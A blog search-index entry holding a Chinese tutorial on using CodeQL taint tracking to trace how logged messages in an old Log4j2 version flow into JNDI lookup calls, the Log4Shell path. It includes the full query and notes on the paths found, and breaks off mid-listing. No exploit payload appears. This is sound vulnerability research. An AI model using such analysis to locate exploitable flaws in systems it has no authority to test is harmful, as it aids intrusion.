<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CodeQL log4j实战</title>
    <link href="/decemberus.com/2024/01/01/CodeQL%20log4j%E5%AE%9E%E6%88%98/"/>
    <url>/decemberus.com/2024/01/01/CodeQL%20log4j%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="CodeQL-log4j实战"><a href="#CodeQL-log4j实战" class="headerlink" title="CodeQL log4j实战"></a>CodeQL log4j实战</h1><p>构建过程</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>logging-log4j2.git<br>git checkout be881e5<br></code></pre></td></tr></table></figure><p>pom.xml中注释掉无关内容</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bnf"><span class="hljs-attribute">&lt;modules&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-api-java9<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-api<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-core-java9<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-core<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;!-- &lt;module&gt;</span>log4j-layout-template-json<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-core-its<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-1.2-api<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-slf4j-impl<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-slf4j18-impl<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-to-slf4j<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-jcl<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-flume-ng<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-taglib<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-jmx-gui<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-samples<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-bom<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-jdbc-dbcp2<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-jpa<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-couchdb<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-mongodb3<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-mongodb4<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-cassandra<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-web<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-perf<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-iostreams<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-jul<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-jpl<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-liquibase<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-appserver<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-osgi<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-docker<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-kubernetes<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-spring-boot<span class="hljs-attribute">&lt;/module&gt;</span><br><br>    <span class="hljs-attribute">&lt;module&gt;</span>log4j-spring-cloud-config<span class="hljs-attribute">&lt;/module&gt;</span> --&gt;<br><br>  <span class="hljs-attribute">&lt;/modules&gt;</span><br></code></pre></td></tr></table></figure><p>现在直接构建数据库会报找不到toolchain的错误，所以我们需要去maven的根目录下面构建toolchain</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">toolchains</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">toolchain</span>&gt;</span>  <br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>jdk<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>  <br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">provides</span>&gt;</span>  <br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">vendor</span>&gt;</span>sun<span class="hljs-tag">&lt;/<span class="hljs-name">vendor</span>&gt;</span>  <br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">provides</span>&gt;</span>  <br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>  <br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jdkHome</span>&gt;</span>C:\Program Files\Java\jdk-9.0.4<span class="hljs-tag">&lt;/<span class="hljs-name">jdkHome</span>&gt;</span>  <br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>  <br><br><span class="hljs-tag">&lt;/<span class="hljs-name">toolchain</span>&gt;</span>  <br><br><span class="hljs-tag">&lt;/<span class="hljs-name">toolchains</span>&gt;</span><br></code></pre></td></tr></table></figure><p>构建数据库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">CodeQL database create Log4jDB <span class="hljs-params">--language=java</span> <span class="hljs-params">--overwrite</span> <span class="hljs-params">--command=</span><span class="hljs-string">&quot;mvn clean install -Dmaven.test.skip=true&quot;</span><br></code></pre></td></tr></table></figure><p>我们根据<a href="https://github.com/SummerSec/LookupInterface/blob/main/TaintTracking.ql">LookupInterface</a>来修改我们自己的代码，下面这个用来找到常见的触发JNDIlookup的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Context</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">RefType</span>&#123;<br>    Context()&#123;<br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;javax.naming&quot;</span>, <span class="hljs-string">&quot;Context&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;javax.naming&quot;</span>, <span class="hljs-string">&quot;InitialContext&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.springframework.jndi&quot;</span>, <span class="hljs-string">&quot;JndiCallback&quot;</span>)<br>        or <br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.springframework.jndi&quot;</span>, <span class="hljs-string">&quot;JndiTemplate&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.springframework.jndi&quot;</span>, <span class="hljs-string">&quot;JndiLocatorDelegate&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.apache.shiro.jndi&quot;</span>, <span class="hljs-string">&quot;JndiCallback&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.getQualifiedName().matches(<span class="hljs-string">&quot;%JndiCallback&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.getQualifiedName().matches(<span class="hljs-string">&quot;%JndiLocatorDelegate&quot;</span>)<br>        or<br>        <span class="hljs-built_in">this</span>.getQualifiedName().matches(<span class="hljs-string">&quot;%JndiTemplate&quot;</span>)<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>寻找那里调用了Context的lookup方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Call</span> <span class="hljs-keyword">call</span>,Callable parseExpression<br><br><span class="hljs-keyword">where</span><br><br>    <span class="hljs-keyword">call</span>.getCallee() = parseExpression <span class="hljs-keyword">and</span> <br><br>    parseExpression.getDeclaringType() instanceof Context <span class="hljs-keyword">and</span><br><br>    parseExpression.hasName(&quot;lookup&quot;)<br><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">call</span><br></code></pre></td></tr></table></figure><p>如此一来我们就找到了sink</p><p>虽然Codeql定义了<code>RemoteFlowSource</code>支持多种source，但是我们还是要根据实际的代码业务来分析可能作为source的点。</p><p>在Log4j作为日志记录的工具，除了从HTTP请求中获取输入点外，还可以在记录日志请求或者解析配置文件中来获取source。先不看解析配置文件获取source的点了，因为这需要分析Log4j解析配置文件的流程比较复杂。所以目前我们只考虑通过日志记录作为source的情况。稍微了解Log4j的同学都知道，Log4j会通过<code>error/fatal/info/debug/trace</code>等方法对不同级别的日志进行记录。通过分析我们可以看到我们输入的message都调用了<code>logIfEnabled</code>方法并作为第四个参数输入，所以可以将这里定义为source。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Logger</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">RefType</span>&#123;<br>    Logger()&#123;<br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.apache.logging.log4j.spi&quot;</span>, <span class="hljs-string">&quot;AbstractLogger&quot;</span>)<br>    &#125;<br>&#125;<br><br>predicate <span class="hljs-title function_">isLookup</span><span class="hljs-params">(Expr arg)</span> &#123;<br>    exists(MethodAccess ma |<br>        ma.getMethod().getName() = <span class="hljs-string">&quot;lookup&quot;</span><br>        and<br>        ma.getMethod().getDeclaringType() <span class="hljs-keyword">instanceof</span> Context<br>        <span class="hljs-type">and</span><br>        <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> ma.getArgument(<span class="hljs-number">0</span>)<br>    )<br>&#125;<br><br>predicate <span class="hljs-title function_">isLogging</span><span class="hljs-params">(Expr arg)</span> &#123;<br>    exists(MethodAccess ma |<br>        ma.getMethod().getName() = <span class="hljs-string">&quot;logIfEnabled&quot;</span><br>        and<br>        ma.getMethod().getDeclaringType() <span class="hljs-keyword">instanceof</span> Logger<br>        <span class="hljs-type">and</span><br>        <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> ma.getArgument(<span class="hljs-number">3</span>)<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来定义source和sink</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TainttrackLookup</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TaintTracking</span>::Configuration &#123;<br>    TainttrackLookup() &#123; <br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;TainttrackLookup&quot;</span> <br>    &#125;<br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node source)</span> &#123;<br>       exists(Expr exp |<br>           isLogging(exp)<br>           and<br>           source.asExpr() = exp<br>        )<br>    &#125;<br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node sink)</span> &#123;<br>        exists(Expr arg |<br>            isLookup(arg)<br>            and<br>            sink.asExpr() = arg<br>        )<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>整体的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> *<span class="hljs-doctag">@name</span> Tainttrack Context lookup</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> *<span class="hljs-doctag">@kind</span> path-problem</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">import</span> semmle.code.java.dataflow.FlowSources<br><br><span class="hljs-keyword">import</span> DataFlow::PathGraph<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Context</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">RefType</span>&#123;<br><br>    Context()&#123;<br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;javax.naming&quot;</span>, <span class="hljs-string">&quot;Context&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;javax.naming&quot;</span>, <span class="hljs-string">&quot;InitialContext&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.springframework.jndi&quot;</span>, <span class="hljs-string">&quot;JndiCallback&quot;</span>)<br><br>        or <br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.springframework.jndi&quot;</span>, <span class="hljs-string">&quot;JndiTemplate&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.springframework.jndi&quot;</span>, <span class="hljs-string">&quot;JndiLocatorDelegate&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.apache.shiro.jndi&quot;</span>, <span class="hljs-string">&quot;JndiCallback&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.getQualifiedName().matches(<span class="hljs-string">&quot;%JndiCallback&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.getQualifiedName().matches(<span class="hljs-string">&quot;%JndiLocatorDelegate&quot;</span>)<br><br>        or<br><br>        <span class="hljs-built_in">this</span>.getQualifiedName().matches(<span class="hljs-string">&quot;%JndiTemplate&quot;</span>)<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Logger</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">RefType</span>&#123;<br><br>    Logger()&#123;<br><br>        <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;org.apache.logging.log4j.spi&quot;</span>, <span class="hljs-string">&quot;AbstractLogger&quot;</span>)<br><br>    &#125;<br><br>&#125;<br><br>predicate <span class="hljs-title function_">isLookup</span><span class="hljs-params">(Expr arg)</span> &#123;<br><br>    exists(MethodAccess ma |<br><br>        ma.getMethod().getName() = <span class="hljs-string">&quot;lookup&quot;</span><br><br>        and<br><br>        ma.getMethod().getDeclaringType() <span class="hljs-keyword">instanceof</span> Context<br><br>        <span class="hljs-type">and</span><br><br>        <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> ma.getArgument(<span class="hljs-number">0</span>)<br><br>    )<br><br>&#125;<br><br>predicate <span class="hljs-title function_">isLogging</span><span class="hljs-params">(Expr arg)</span> &#123;<br><br>    exists(MethodAccess ma |<br><br>        ma.getMethod().getName() = <span class="hljs-string">&quot;logIfEnabled&quot;</span><br><br>        and<br><br>        ma.getMethod().getDeclaringType() <span class="hljs-keyword">instanceof</span> Logger<br><br>        <span class="hljs-type">and</span><br><br>        <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> ma.getArgument(<span class="hljs-number">3</span>)<br><br>    )<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TainttrackLookup</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TaintTracking</span>::Configuration &#123;<br><br>    TainttrackLookup() &#123; <br><br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;TainttrackLookup&quot;</span> <br><br>    &#125;<br><br><br><br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node source)</span> &#123;<br><br>        exists(Expr exp |<br><br>            isLogging(exp)<br><br>            and<br><br>            source.asExpr() = exp<br><br>        )<br><br>    &#125;<br><br><br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node sink)</span> &#123;<br><br>        exists(Expr arg |<br><br>            isLookup(arg)<br><br>            and<br><br>            sink.asExpr() = arg<br><br>        )<br><br>    &#125;<br><br>&#125; <br><br>from TainttrackLookup config , DataFlow::PathNode source, DataFlow::PathNode sink<br><br>where<br><br>    config.hasFlowPath(source, sink)<br><br>select sink.getNode(), source, sink, <span class="hljs-string">&quot;unsafe lookup&quot;</span>, source.getNode(), <span class="hljs-string">&quot;this is user input&quot;</span><br></code></pre></td></tr></table></figure><p>虽然使用CodeQL查询语句可以找到很多使用Log4j打印日志的地方，但是在实际的代码中，可能不会使用logIfEnabled方法，而是直接使用其他的方法，比如info, debug, error等，这些方法不需要传入Marker参数，而是直接传入message参数，这样就会导致CodeQL查询语句的源点不准确，无法追踪到用户输入的数据。</p><p>所以我们需要变一下source，我们source并不一定是一定要调用logIFEnabled方法的，还有可能需要是带有一个参数的<code>error/fatal/info/debug/trace</code>等方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerInput</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">Method</span> &#123;<br><br>    LoggerInput()&#123;<br><br>        <span class="hljs-comment">//限定调用的类名、方法名、以及方法只有一个参数</span><br><br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> Logger and<br><br>        <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;error&quot;</span>) and <span class="hljs-built_in">this</span>.getNumberOfParameters() = <span class="hljs-number">1</span><br><br>    &#125;<br><br>    <span class="hljs-comment">//将第一个参数作为source</span><br><br>    Parameter <span class="hljs-title function_">getAnUntrustedParameter</span><span class="hljs-params">()</span> &#123; result = <span class="hljs-built_in">this</span>.getParameter(<span class="hljs-number">0</span>) &#125;<br><br>&#125;<br><br>override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node source)</span> &#123;<br><br>        exists(LoggerInput LoggerMethod |<br><br>            source.asParameter() = LoggerMethod.getAnUntrustedParameter())<br><br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231125205127207.png" alt="image-20231125205127207"> </p><p>我们可以找到以下四条路径,我们先看第一条路径</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231125205610200.png" alt="image-20231125205610200"> </p><p>这里由于需要让filter不为null的时候才可以触发，而这里默认为null，所以我们在看看其他的链子</p><p>从上往下看第二条链子</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231125211327599.png" alt="image-20231125211327599"> </p><p>但是在<code>AbstractLogger#tryLogMessage</code>中Codeql会直接分析到<code>AbstractLogger#log</code>而实际请求时会解析到<code>Logger#log</code>方法。这是因为<code>Logger</code>是<code>AbstractLogger</code>的子类并且也实现了log方法，而且我们实例化的也是Logger对象，所以这里会调用到<code>Logger#log</code>。</p><p>下面还有一条链子</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">709</span>:<span class="hljs-number">23</span><br><span class="hljs-number">2</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">710</span>:<span class="hljs-number">47</span><br><span class="hljs-number">3</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">1833</span>:<span class="hljs-number">89</span><br><span class="hljs-number">4</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">1836</span>:<span class="hljs-number">51</span><br><span class="hljs-number">5</span>message : Message 